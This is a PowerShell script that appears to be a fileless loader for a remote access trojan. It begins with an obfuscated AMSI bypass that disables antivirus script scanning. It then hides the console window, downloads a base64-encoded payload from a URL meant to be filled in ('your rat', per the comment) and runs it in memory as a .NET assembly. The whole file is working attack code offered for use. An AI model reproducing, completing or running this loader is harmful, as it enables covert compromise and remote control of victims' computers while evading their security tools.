${w} = ("{11}{2}{6}{13}{9}{5}{8}{0}{4}{7}{3}{10}{1}{12}"-f('B1'+'AH'),'uA',('B5'+'A'+'HM'+'A'+'d'+(('A'+('B'+('lA'+'G')))+'0'+('AL'+'g'))+('B'+('NA'+'G'))),('B'+((('tA'+'G')+'E')+'A')),'Q',(((('U'+'Ab')+'gB')+'0')+'A'+'C'+'4A'),'EA',('Ab'+'w'),'QQ',(((('AG'+'c')+'A')+'Z'+'Q')+('Bt'+'A')+'G'),('d'+(('AB'+'pA')+('G'+'8A')+'bg')+'A'),'Uw',('EE'+'A'),(('b'+'gB')+'h'));${c} = ("{0}{1}{2}"-f (('c'+'wB')+'p'),('A'+'A='),'=');${M} = ("{0}{3}{1}{2}{4}" -f 'VQ',('k'+('Ab'+'A')),'Bz',('B0'+'AG'),('AA'+'=='));${ASSEM`B`ly} = [Ref].Assembly.GetType(('{0}m{1}{2}' -f [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${w})),[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${c})),[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${M}))));${F`i`ELd} = ${ass`EmB`Ly}.GetField(('am{0}InitFailed' -f [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${c}))),("{0}{3}{1}{2}{4}"-f ('No'+'nP'),('c,'+'St'+'at'),'i',('u'+('bl'+'i')),'c'));${F`ie`Ld}.SetValue(${NU`Ll},${TR`Ue})
$webClient = New-Object System.Net.WebClient


function Show-Console
{
    param ([Switch]$Show,[Switch]$Hide)
    if (-not ("Console.Window" -as [type])) { 

        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }

    if ($Show)
    {
        $consolePtr = [Console.Window]::GetConsoleWindow()

        # Hide = 0,
        # ShowNormal = 1,
        # ShowMinimized = 2,
        # ShowMaximized = 3,
        # Maximize = 3,
        # ShowNormalNoActivate = 4,
        # Show = 5,
        # Minimize = 6,
        # ShowMinNoActivate = 7,
        # ShowNoActivate = 8,
        # Restore = 9,
        # ShowDefault = 10,
        # ForceMinimized = 11

        $null = [Console.Window]::ShowWindow($consolePtr, 5)
    }

    if ($Hide)
    {
        $consolePtr = [Console.Window]::GetConsoleWindow()
        #0 hide
        $null = [Console.Window]::ShowWindow($consolePtr, 0)
    }
}
show-console -hide


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12


$wc = New-Object System.Net.WebClient
$file = $wc.DownloadString("") #you will convert the direct download link of your rat to base64 and put it in the txt file and put the download link

[AppDomain]::CurrentDomain.Load([Convert]::FromBase64String($file)).EntryPoint.Invoke($Null,$Null)
